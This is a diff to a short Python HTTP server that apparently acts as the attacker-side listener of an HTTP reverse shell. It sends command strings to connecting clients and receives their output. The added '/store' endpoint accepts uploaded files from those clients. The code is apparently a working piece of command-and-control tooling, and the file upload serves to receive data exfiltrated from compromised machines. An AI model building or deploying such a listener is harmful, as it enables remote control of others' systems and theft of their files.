@@ -1,7 +1,7 @@
 # HTTP SERVER
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import cgi
+import os, cgi
 
 HOST_NAME = "127.0.0.1"
 PORT_NUMBER = 80
@@ -18,6 +18,28 @@ class MyHandler(BaseHTTPRequestHandler):
         self.wfile.write(command.encode())
 
     def do_POST(self):
+
+        if self.path == "/store":
+            try:
+                ctype, blabla = cgi.parse_header(self.headers["Content-Type"])
+                if ctype == "multipart/form-data":
+                    fs = cgi.FieldStorage(
+                        fp=self.rfile,
+                        headers=self.headers,
+                        environ={"REQUEST_METHOD": "POST"}
+                    )
+                    fs_up = fs["file"]
+                    with open("./test.txt", "w") as o:
+                        o.write(fs_up.file.read().decode())
+                        self.send_response(200)
+                        self.end_headers()
+                else:
+                    print("[-] Undexpected POST request")
+            except Exception as e:
+                print(e)
+
+            return
+
         self.send_response(200)
         self.end_headers()
         length = int(self.headers["Content-Length"])
